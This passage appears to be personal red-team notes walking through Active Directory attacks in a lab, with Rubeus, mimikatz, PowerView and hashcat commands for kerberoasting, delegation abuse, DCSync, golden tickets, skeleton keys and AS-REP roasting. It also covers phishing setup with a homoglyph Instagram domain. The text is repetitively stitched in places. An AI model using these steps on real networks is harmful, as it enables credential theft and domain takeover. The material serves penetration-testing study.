![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MXP4z89VuO8CYCMkqgc%2F-MXP5RlMGvBMDMLG5l-k%2Fimage.png?alt=media&token=da5febf5-f3e7-46b3-9591-48df92325420)

We can see our user John Constantine has this preauth now we can copy this ticket and move it onto our cracking tool (hashcat) and grab some cleartext credentials.

Be wary that a 23 needs to be added onto our hash as Rubeus does not do this for us

$krb5asrep$

**23**

[[email protected]](/cdn-cgi/l/email-protection)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MXP4z89VuO8CYCMkqgc%2F-MXP5TQpouX2BbIAtiXT%2Fimage.png?alt=media&token=10380f22-5008-4f6d-9f2c-6e7ae528b1bb)

After a moment with hashcat and adding some rules we can take a look that our word-list successfully cracked the password.

# active-directory-attacks

In this section I will work and go through some of the well-known AD Attack techniques that are commonly known or available in the environment.

## kerberoasting

You have an SPN service/user the attack works because by default any domain user can request a Ticket to these user's/services the Kerberos grant's a ticket, this ticket is later stored in memory and you can grab this ticket, save it offline and crack the hash file to gain clear-text credentials.

Tim Medin presented at DerbyCon 2014 a tool called Kerberoast which cracks Kerberoast TGS tickets, He determined that possession of a TGS service ticket encrypted with the RC4 provides the opportunity to take the ticket to a password cracking computer (or cloud system) and attempt to crack the service account's password. How does this work? Since the TGS Kerberos ticket is encrypted with the RC4 encryption, that means the service account's password hash is used to encrypt the ticket. The cracking system loops through converts to NTLM, and attempts to open the TGS ticket. If the TGS ticket is opened, we know the clear text password and the NTLM password for the account.

In Summary

Kerberoasting abuses traits of the Kerberos protocol to harvest password hashes for Active Directory user accounts with serviceprincipalName (SPN) values (i.e. service accounts). A user is allowed to request a ticket-granting service (TGS) ticket for any SPN, and parts of the TGS may be encrypted with the RC4 using the password hash of the service account assigned the requested SPN as the key.

An adversary who can extract the TGS ticket from memory, or capture them by sniffing network traffic, can extract the service account's password hash and attempt an offline brute force attack to obtain the plaintext password.

**Attack**

The setup for this attack can be viewed 

[here](https://medium.com/@markmotig/kerberoasting-from-setup-to-cracking-3e8c980f26e8)

​

Now will use a few methods to search for any Kerberoastable Users. This can be done with any domain user this attack is abused since any domain user can request a ticket for an SPN account we verify our domain account

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FZdXCuPEZb4567TAUhdSa%2Fimage.png?alt=media&token=049e42a9-72ed-4f47-b19c-5a05e6475119)

I will continue with the Rubeus tool and request for the ticket of the specific user, we can use Rubeus to find kerberoastable users without kerberoasting and leaving many requests done by our user for a kerberoast some opsec to consider this won't show which user is kerberoastable but how many are available.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FpZGTYmdhcQUZp2kqURSZ%2Fimage.png?alt=media&token=17efd774-f86b-4f20-aab4-b889582245b3)

Now we can request the tickets from the users and choose the format-specific for our cracking tool which this preference would be hashcat

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fk6DJbOgkLJUs4EgW5f3K%2Fimage.png?alt=media&token=007dd445-0a0c-4ffb-ab5e-c428fbb758b0)

Now with this available, we can crack the password offline utilizing hashcat, once sent to our cracking rig we can use wordlists to attack this hash and try cracking it with this one we managed to get the password by utilizing the RockYou wordlist with a ruleset.

hashcat.exe -m 13100 -a 0 hashes wordlist

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FRaQ9jCEf1f3pCsdrUSvZ%2Fimage.png?alt=media&token=62bf2577-e556-436a-8db6-6d9bd40bfd71)

## unconstrained-delegation

When a user accesses a server with unconstrained delegation enabled, the user sends their TGT to the server. The server can then impersonate the user by using their user's TGT to authenticate to other services in the network.

But what is delegation? Delegation is a feature in Active Directory that allows a user or a computer to impersonate another account. Microsoft had to provide a simple mechanism to support scenarios where a user authenticates to a Web Server via Kerberos and needs to update records on a back-end database server on behalf of the user. This is typically referred to as the "Kerberos double-hop issue" and requires delegation.

**What the risk?**

Once you turn on unconstrained delegation to a computer, any time an account connects to that computer for any reason, their ticket (TGT) is stored in memory so it can be used later by the computer for impersonation. Let's say you enable this option on a computer you have administrative access to and then get a Domain Admin user to access the computer over the Common Internet File System (CIFS) by accessing a shared folder. Without unconstrained delegation on, only the ticket-granting server (TGS) would be stored in memory on your compromised machine. This ticket gives access only to the CIFS service on your machine so you can't use it to move laterally. However, with unconstrained delegation enabled, when the privileged user connects to your machine, their TGT will be stored in memory, which can be replayed to move laterally and compromise a domain controller.

TL;DR

As we mentioned before what is the risk to having Unconstrained Delegation, is that anytime an account connects to the compromised computer for any reason, their ticket (TGT)is stored in memory so it can be used later by the computer for impersonation.

**Attack**

First to setup this attack path this needs to be done from the DC, we right click on the PC name and "Trust this computer for delegation to any service (Kerberos only)" option checked.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJ_qVSX7EFvxtxp8n%2Fimage.png?alt=media&token=a32b696b-4531-4e1d-8160-3116af5d6829)

Now it's time to search for the machine that has the Unconstrained Delegation available for it. We find this with utilizing PowerView

Get-NetComputer -Unconstrained

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJavj5WlW-W9dA-20%2Fimage.png?alt=media&token=650cbf15-8e53-46f4-8114-02ccc77bea89)

Now let's say our goal is to reach Desktop-Alpha and we have no permissions to access the machine.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJbiQ-eWp5YJIDO7l%2Fimage.png?alt=media&token=5c99d44b-782d-4970-99d4-151610499c93)

**Administrator Privileges from here**

Now we will need to elevate our privileges on the host machine to start capturing tickets once that is done we have to wait for a user that has access to Desktop-Alpha and we can use the ticket to access the target machine (For the sake of Demo I will have a user access a folder on Desktop-Charlie)

We run Rubeus in monitor mode, I used an interval of 10 seconds  after this I managed to capture the ticket.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJcZmJhKMhkyK-494%2Fimage.png?alt=media&token=d6c6c1dd-6ac0-432c-902d-e9f71957bc08)

Successfully done this I will save the ticket then pass it onto my current session.

Rubeus ptt /ticket:<TICKET BASE64>

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJdheJqpvobwCOE9y%2Fimage.png?alt=media&token=207fe52b-26d7-44a2-917c-43e627402070)

Then we try and list the C$ share on the machine and we are successful

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJeXVheD6H6EZizZY%2Fimage.png?alt=media&token=01280fa0-69e5-4243-8085-8a6ee3aeee35)

We are aware this user is a Local Administrator to the Machine so we can also grab a shell. Will create a process for this and inject our ticket to this PID so we are allowed to do Network Actions

Rubeus createnetonly /program:C:\Windows\System32\cmd.exe

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJf_sT227fMhZm3Zb%2Fimage.png?alt=media&token=a764d934-0704-4362-ade0-e3bcab9130b9)

Then we will inject the ticket in the newly created process take a note in the LUID

Rubeus ptt /luid:0x302756 /ticket:<TICKET BASE64>

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJgal7wcr3uQLHITY%2Fimage.png?alt=media&token=124fe3a9-eb8d-4ae0-a8d5-21ee46c8df72)

Now Impersonate the Process

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJjU4R3PaUGKzHI1C%2Fimage.png?alt=media&token=3efdd776-460d-4d2e-84b4-53fccf61401a)

With this we can use PSEXEC to gain a Shell on the remote machine

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJigtHjfKWy34FFB2%2Fimage.png?alt=media&token=ee7be3c1-233b-47b7-9143-f8f444c2f717)

And we get a new Grunt on the Target Machine as SYSTEM (PSEXEC does this since it’s a service and these run with the highest privileges)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJkuAp_nZAPuOIRXz%2Fimage.png?alt=media&token=59c1981d-dfbc-45ea-be5a-8637e7c6521a)

WHOAMI, HOSTNAME

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJS6etavExXrFJWrE%2F-MWuJlXQ1niTUJ4LOVWD%2Fimage.png?alt=media&token=2b57240b-4292-4c6e-9d80-95d77eece8b2)

Now that we understand unconstrained delegation this is not the only user we can impersonate on this machine I used this sample since the user was a LOCAL Administrator on the target machine, usually when using this attack we are trying to impersonate Domain Admins but the truth is we can use any user that helps us reach our goal.

## constrained-delegation

Constrained Delegation is a way to limit exactly what services a particular machine/account can access while impersonating other users. The "service" specified is a service principal name that the account is allowed to access while impersonating other users. PowerView can help in locating these attributes, the field of interest is the msds-allowedtodelegateto, but there's also a modification to the accounts' userAccountControl property. Essentially, if a computer/user object has a userAccountControl value containing TRUSTED_TO_AUTH_FOR_DELEGATION then anyone who compromises that account can impersonate any user to the SPNs set in the msds-allowedtodelegateto. Benjamin Delpy metioned that SeEnableDelegationPrivilege being required to actually modify the parameters.

**What's the Risk?**

If you are able to compromise a user account with SPNs set under msds-allowedtodelegateto can pretend to be any user they want to the target service SPN. For the HOST SPN this allows complete remote takeover. For MSSQL SPN this would allow DBA rights. A CIFS SPN would allow complete remote file access. A HTTP SPN this would likely allow for the takeover of the remote web-service, and LDAP allows for DCSync. HTTP/SQSL service accounts, even if they aren't elevated admin on the target, can possibly be abused with Rotten potato to elevate right to SYSTEM.

**Attack**

First let us start using PowerView in the below screenshot you may see that the user jwick is allowed to delegate or in other words impersonate any user and authenticate to a file system.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuJxWcLuXLjrpCWqwB%2Fimage.png?alt=media&token=28bb0d45-12f6-4824-adf8-b632b6df4cde)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuJyWaQj8AS0VFrqOm%2Fimage.png?alt=media&token=2b67d10d-f985-4aac-b231-48405e6516e1)

We liked to focus onto the section for msds-allowedtodelegateto

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuK-INy3w_HgGDKUmi%2Fimage.png?alt=media&token=f687e759-daf3-4b9f-a49e-8a961d549c48)

Now let use dump some tickets and find the correct one for the station we are trying to access .Let's now request a delegation TGT for the user jwick

Rubeus tgtdeleg

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuK0Cp5Lyj2jlOhXNQ%2Fimage.png?alt=media&token=73d6ce0c-388b-44b7-9bba-f5382cc90454)

From here we will use the s4u attack from Rubeus to impersonate a user that has administrator access to the machine Desktop-Delta and continue from there, we want to change the service to CIFS to allow us to list the directories:

Rubeus s4u /ticket:<Ticket from TGTDELEG>  /domain:dominioncyber.local /impersonateuser:jwinchester /msdsspn:http/desktop-delta.dominioncyber.local /dc:dominioncyberdc.dominioncyber.local /ptt /altservice:cifs

TIP: REMOVE THE DOMAIN FROM THE MSDSSPN,  CAREFUL SOMETIMES THE MSDSSPN SECTION WILL ALSO BE ENCAPSULATED IN DOUBLE QUOTES (" ")

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuK1XajrrmkyT6zHIC%2Fimage.png?alt=media&token=ed665704-1e75-42df-a72f-64359843a57a)

Above once we receive the "Ticket successfully imported!" message we can copy the 2nd ticket from the output for later compromise if needed 

**"Remember these are time based"**

From here we can create a process using Rubeus, inject the ticket to that process and allow us network actions.

**Administrator Privileges from here this is only needed to perform netowrk actions**

Rubeus createnetonly /program:C:\Windows\System32\cmd.exe

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuK2WhYLgDap1SUakk%2Fimage.png?alt=media&token=f5d3d93f-ba38-462e-82bc-cac539d0cf74)

We save this information and now ptt onto the LUID and then impersonate the process

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuK3h2uiF4U5PHY7OC%2Fimage.png?alt=media&token=2249994a-8308-46e4-bd8e-4889b1c17c17)

Now impersonate the process

And for some strange reason I would receive something like this

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuK4oB-C3Ix2TosCYR%2Fimage.png?alt=media&token=9e08d7e8-2013-4090-800d-a6b68ac00afc)

So I did some research and found that ired.team had the same issues and requested the ticket in a different way by removing the DOMAIN from the msdsspn section

**/impersonateuser:jwinchester /msdsspn:cifs/DESKTOP-DELTA /ptt **

**[Removed some sections of the original command]**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuJn7PhTK7ITHZ9MnT%2F-MWuK5yRE2e_UyI2boeg%2Fimage.png?alt=media&token=8a68818d-57d1-4a1a-9590-504c4bd35894)

By doing that change I managed to enumerate the shares as I am aware jwick is an Administrator on station Delta.

## dcsync

The concept of DCSync is that it impersonates a Domain Controller to request all the hashes of the users in the domain. Yes. This means as long as you have permissions, you do not need to run any commands on the Domain Controller the need to compromise the DC is not necessary as this one is usually quite difficult

For this to work, it is important to have proper permissions to pull hashes from a Domain Controller. Generally limited to the Domain Admins, Enterprise Admins, Domain Controller Groups, and anyone with the Replicating Changes permissions set to Allow (i.e. Replicating Changes All/Replicating Directory Changes), DCSync will allow your user to perform this attack with the use of mimikatz.

**What's the risk?**

Well if a user can impersonate a Domain Controller and request for all the domain user's passwords, that is enough risk.

**Attack**

We can enumerate a user with these permission with powerview by using the Get-ObjectACL CMDLET

**Get-ObjectAcl -Identity "dc=dominioncyber,dc=local" -ResolveGUIDs | ? {$_.SecurityIdentifier -match "S-1-5-21-1827981533-2463545078-1305764163-1120"}**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuK79aDl7rD5vp7dlW%2F-MWuKEfD0Bh7SmnK2Qop%2Fimage.png?alt=media&token=40330bc9-843c-44b2-bde1-ee9555257293)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuK79aDl7rD5vp7dlW%2F-MWuKFNEYNVUAmTgIDXP%2Fimage.png?alt=media&token=661a156a-bcf6-41e6-83c1-454e6020f66e)

Above, when locating these 2 objects DCSync is allowed for the user. This is as simple as running DCSync <username> on Covenant and grabbing the hashes for the krbtgt user.

It also has a sample on what command is being executed when utilizing mimikatz

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuK79aDl7rD5vp7dlW%2F-MWuKGRJKzor3xsgEn-K%2Fimage.png?alt=media&token=363f7cca-3eb0-46ef-85bf-5a6a203fef13)

And we can do this for any user of our choosing in the entire Domain

Jwick

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuK79aDl7rD5vp7dlW%2F-MWuKHJTV1qvSqH4cb0t%2Fimage.png?alt=media&token=5d230f54-6269-408a-9221-124ebfa78b11)

Understanding this technique and exploiting is valuable as this can provide persistence with the highest privileges on the Domain and can be also used to initiate other techniques such as Golden/Silver Tickets.

## golden-tickets

The KRBTGT Account, every Active Directory Domain Controller is responsible for handling Kerberos Ticket requests, which are used to authenticate users and grant them access to computers and applications. The KRBTGT account is used to encrypt and sign all Kerberos tickets within a domain, and a domain controllers use the account password to decrypt Kerberos tickets for validation. This account password never changes, and the account name is the same in every domain, so it's a well-known target for attackers.

**What's the risk?**

Once an attacker compromises the KRBTGT account they can create forged Kerberos tickets (TGTs) which can be used to request TGS tickets for any service on any computer in the domain. But remember the hardest part of this attack is you need Administrator Access to the DC (Domain Controller), these attacks are hard to detect because they are valid TGTs.

For Demo purposes we have the KRBTGT Hash and a Shell  with the user Mgarcia, if we enumerate the DC Directory we don't have access.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuKRcrptTRJIIUwTIV%2F-MWuKTt9ie5HdsurK_4R%2Fimage.png?alt=media&token=9e90cea7-a097-4856-8a88-386d08481eae)

Now let us use the binary form of mimikatz as there is no way that I am familiar with that this technique will work straight from Covenant I move to a local CMD (you can also use RDP if available and probably PSRemoting), we will first need the SID of the User and the KRBTGT hash

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuKRcrptTRJIIUwTIV%2F-MWuKUhlTWl0s5O5k5XW%2Fimage.png?alt=media&token=5d0f7c60-0916-4d4c-bb12-e3aec4edcdc4)

We will copy everything but the last 4 digits as they identify the user and we want to replace that with a 500 SID user. In our previous attack DCSync we grabbed the KRBTGT hash so we can skip this, as the user had DCSync permissions it was easy to grab without compromising the DC.

And now we will use the command for mimikatz to grab and pass the ticket onto our current session.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuKRcrptTRJIIUwTIV%2F-MWuKVfYUntEbvU6LCRe%2Fimage.png?alt=media&token=71142320-4512-4d15-bdbd-ec1114740537)

Once we execute the command successfully, we can enumerate the C Drive from the DC.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuKRcrptTRJIIUwTIV%2F-MWuKWbciGUC_Cf45WEt%2Fimage.png?alt=media&token=f05b52dc-59a7-4216-8d29-d08e3573dc6f)

As you can see now with the KRBTGT Account's NTLM Hash we can forge ticket to any user or create our own and give them the highest privileges on the Domain, this is a great method for persistence

## silver-tickets

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuKkrf-b0f4PEoQ6Nr%2F-MWuL1taskEejOK7ROSn%2Fimage.png?alt=media&token=f9ea2861-a7ca-489a-8f7d-cfad2bb37ab5)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuKkrf-b0f4PEoQ6Nr%2F-MWuMF1D1_0MzJMZbkr9%2Fezgif.com-gif-maker.gif?alt=media&token=4c3758b2-21c8-4939-882d-2a40a7dda529)

## skeleton-keys

The Skeleton Key malware "patches" the security system enabling a new master password to be accepted for any domain user, including admins.

This enables the attacker to logon as any user they want with the master password (skeleton key) configured in the malware.

"Joe User" logs in using his usual password with no changes to his account. The attacker can log in as Joe using the skeleton key password and it is seen as a valid logon.

**Attack**

In order to perpetrate this attack, the attacker must have Domain Admin rights. This attack must be performed on each and every domain controller for complete compromise, but even targeting a single domain controller can be effective. Rebooting a domain controller will remove this malware and it will have to be redeployed by the attacker.

To start the attack we can simply use mimkatz as it has this technique available a few command lines and we can reach our goal

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuKhOo68FH3uF6rWDj%2F-MWuKjGRd6N9wTL2-E-9%2Fimage.png?alt=media&token=4ae9a406-7d84-41c7-b3ef-d7c63ec5fa15)

Now we can access anywhere on our Domain with the default password "mimikatz" and we can authenticate utilizing any of the Domain Admins available in the Domain.

**This will work for any user not just Domain Admins, this is a Master Password for everyone.**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MWuKhOo68FH3uF6rWDj%2F-MWuKkFMUZ_0Z04LkpNO%2Fimage.png?alt=media&token=0ba26f5d-cb0a-4dd7-b6a4-eea1dfd29c5e)

We do have to take in consideration that this technique will stop working when the DC is rebooted, as this will patch the "lsass.exe" in memory and once rebooted this will stop.

## as-rep-roasting

AS-REP Roasting is an attack against Kerberos for user accounts that do not require preauthentication. This is explained in pretty thorough detail in HarmJ0y's post. Pre-Authentication is the first step in Kerberos authentication and is designed to prevent brute-force password guessing attacks.

During preauthentication, a user will enter their password which will be used to encrypt a timestamp, and then the domain controller will attempt to decrypt it and validate that the right password was used and that it is not replaying previous requests. From there the TGT will be issued for the user to use for future authentication. If preauthentication is disabled, an attacker could request authentication data for any user and the DC would return an encrypted TGT that can be brute-forced offline.

**What's the risk?**

If we can enumerate accounts in a Windows domain that do not require Kerberos preauthentication, we can now easily request a piece of encrypted information for the accounts and crack the material offline, gaining clear text credentials.

**Attack**

Rubeus allows us to simplify this attack by using the asreproast parameter on the tool, this will find all users with the vulnerability and request a ticket

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MXP4z89VuO8CYCMkqgc%2F-MXP5RlMGvBMDMLG5l-k%2Fimage.png?alt=media&token=da5febf5-f3e7-46b3-9591-48df92325420)

We can see our user John Constantine has this preauth now we can copy this ticket and move it onto our cracking tool (hashcat) and grab some cleartext credentials.

Be wary that a 23 needs to be added onto our hash as Rubeus does not do this for us

$krb5asrep$

**23**

[[email protected]](/cdn-cgi/l/email-protection)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MXP4z89VuO8CYCMkqgc%2F-MXP5TQpouX2BbIAtiXT%2Fimage.png?alt=media&token=10380f22-5008-4f6d-9f2c-6e7ae528b1bb)

After a moment with hashcat and adding some rules we can take a look that our word-list successfully cracked the password.

# red-team-infrastructure

 

RED TEAM INFRASTRUCTURE:

A Red Team infrastructure is the steps that are being taken to set up your Environment for a successful Red Team Engagement.

I did a heavy reference on this GitHub project:

​

[https://github.com/infosecn1nja/Red-Teaming-Toolkit](https://github.com/infosecn1nja/Red-Teaming-Toolkit)

https://github.com/infosecn1nja/Red-Teaming-Toolkit

And Red Team Course

https://courses.zeropointsecurity.co.uk/courses/red-team-ops

[https://courses.zeropointsecurity.co.uk/courses/red-team-ops](https://github.com/infosecn1nja/Red-Teaming-Toolkit)

Also MITRE ATT&CK

https://attack.mitre.org/

[https://attack.mitre.org/](https://github.com/infosecn1nja/Red-Teaming-Toolkit)

Many of these techniques are beginner nothing advanced or too complicated, if you would like more details on the technique or probably research more of them do please refer to my Red Team notes to check out other methods as well, and if that does not answer your questions. Google is the best teacher out there.

## red-team-infrastructure

 

RED TEAM INFRASTRUCTURE:

A Red Team infrastructure is the steps that are being taken to set up your Environment for a successful Red Team Engagement.

I did a heavy reference on this GitHub project:

​

[https://github.com/infosecn1nja/Red-Teaming-Toolkit](https://github.com/infosecn1nja/Red-Teaming-Toolkit)

https://github.com/infosecn1nja/Red-Teaming-Toolkit

And Red Team Course

https://courses.zeropointsecurity.co.uk/courses/red-team-ops

[https://courses.zeropointsecurity.co.uk/courses/red-team-ops](https://github.com/infosecn1nja/Red-Teaming-Toolkit)

Also MITRE ATT&CK

https://attack.mitre.org/

[https://attack.mitre.org/](https://github.com/infosecn1nja/Red-Teaming-Toolkit)

Many of these techniques are beginner nothing advanced or too complicated, if you would like more details on the technique or probably research more of them do please refer to my Red Team notes to check out other methods as well, and if that does not answer your questions. Google is the best teacher out there.

### red-team-infrastructure

 

RED TEAM INFRASTRUCTURE:

A Red Team infrastructure is the steps that are being taken to set up your Environment for a successful Red Team Engagement.

I did a heavy reference on this GitHub project:

​

[https://github.com/infosecn1nja/Red-Teaming-Toolkit](https://github.com/infosecn1nja/Red-Teaming-Toolkit)

https://github.com/infosecn1nja/Red-Teaming-Toolkit

And Red Team Course

https://courses.zeropointsecurity.co.uk/courses/red-team-ops

[https://courses.zeropointsecurity.co.uk/courses/red-team-ops](https://github.com/infosecn1nja/Red-Teaming-Toolkit)

Also MITRE ATT&CK

https://attack.mitre.org/

[https://attack.mitre.org/](https://github.com/infosecn1nja/Red-Teaming-Toolkit)

Many of these techniques are beginner nothing advanced or too complicated, if you would like more details on the technique or probably research more of them do please refer to my Red Team notes to check out other methods as well, and if that does not answer your questions. Google is the best teacher out there.

### domain-name-and-categorization

Domains are classified using a combination of Machine Learning (ML) and human inspection. New Domains are always uncategorized and do not know how to

categorize the domains, for example when a new Domain is registered, they are usually left uncategorized and are known to be malicious, but a regular domain

such as a shopping site can be categorized correctly as a shop, e-commerce, or business site aging a site is helpful since a known malicious site is known for being "fresh" or recently purchased.

**This is a preference that just started from my personal experience, it does not need to follow these, but I've only worked with these tools, you can choose any person you want.**

**NameCheap**

:

At Namecheap, we need to change the NS servers and have them point to the AWS one and remember to categorize and age the site domain name

**Domain**

​

[http://ínstagram.com/](http://xn--nstagram-b2a.com)

 

In AWS we will need to use Route53 and Create Records to have them point to Namecheap, so the domain name shows instead of the IP

AWS: Holds a fake Instagram Webpage on an EWS Instance free, no need for more power since it can hold enough for payloads or webpages.

Certificates:

An SSL certificate is important for the website as it adds more legitimacy to the domain an option for this would be Let's Encrypt as others as well, do not limit yourself to only 1 option.

### reconnaissance

Reconnaissance is the first step into gaining access to the target for example if this is an individual target the more information we can gather about the user the better our delivery in Phishing can be, if this is corporate say then the more information we can gather in our recon we might not need the Phishing Method for Initial Access maybe there is a public exploit that help us gain access but we can also take the approach of gaining employee information and work as if it was an individual user.

There are 2 methods for gathering information Passive and Active.

Passive:

 

This is a good approach for gathering information as we will NOT touch the target in any way such as Scanning Ports making an unusual request to the user/business to gather information.

Active:

This method is NOISY this method in approaching the target is a great method for gathering even more personal, specific, or more information about a target that is usually not found in the passive method but it's a great way to get caught.

### weaponization

Weaponizing or Payload Development, it's time to build the payload that will give us a foothold on the target's network, we can use the information we have gathered from the target to help us build a payload that will work, evade defenses and give us access.

I will be speaking of the Modern Methods and Common Attachment Payloads in my examples if you would like to read more methods look for my 

[RedTeam Notes 2.0](https://dmcxblue.gitbook.io/red-team-notes-2-0/)

​

 

### delivery

Our method for delivering our phishing payloads this is an important step in our red team infrastructure as this is a deciding factor if our payload will be even delivered to our user, a framework that can deliver our payloads with success is a great tool fortunately also counting all the pre-steps taking in the Domain Section the majority of these are well known and open source.

## domain-name-and-categorization

Domains are classified using a combination of Machine Learning (ML) and human inspection. New Domains are always uncategorized and do not know how to

categorize the domains, for example when a new Domain is registered, they are usually left uncategorized and are known to be malicious, but a regular domain

such as a shopping site can be categorized correctly as a shop, e-commerce, or business site aging a site is helpful since a known malicious site is known for being "fresh" or recently purchased.

**This is a preference that just started from my personal experience, it does not need to follow these, but I've only worked with these tools, you can choose any person you want.**

**NameCheap**

:

At Namecheap, we need to change the NS servers and have them point to the AWS one and remember to categorize and age the site domain name

**Domain**

​

[http://ínstagram.com/](http://xn--nstagram-b2a.com)

 

In AWS we will need to use Route53 and Create Records to have them point to Namecheap, so the domain name shows instead of the IP

AWS: Holds a fake Instagram Webpage on an EWS Instance free, no need for more power since it can hold enough for payloads or webpages.

Certificates:

An SSL certificate is important for the website as it adds more legitimacy to the domain an option for this would be Let's Encrypt as others as well, do not limit yourself to only 1 option.

## reconnaissance

Reconnaissance is the first step into gaining access to the target for example if this is an individual target the more information we can gather about the user the better our delivery in Phishing can be, if this is corporate say then the more information we can gather in our recon we might not need the Phishing Method for Initial Access maybe there is a public exploit that help us gain access but we can also take the approach of gaining employee information and work as if it was an individual user.

There are 2 methods for gathering information Passive and Active.

Passive:

 

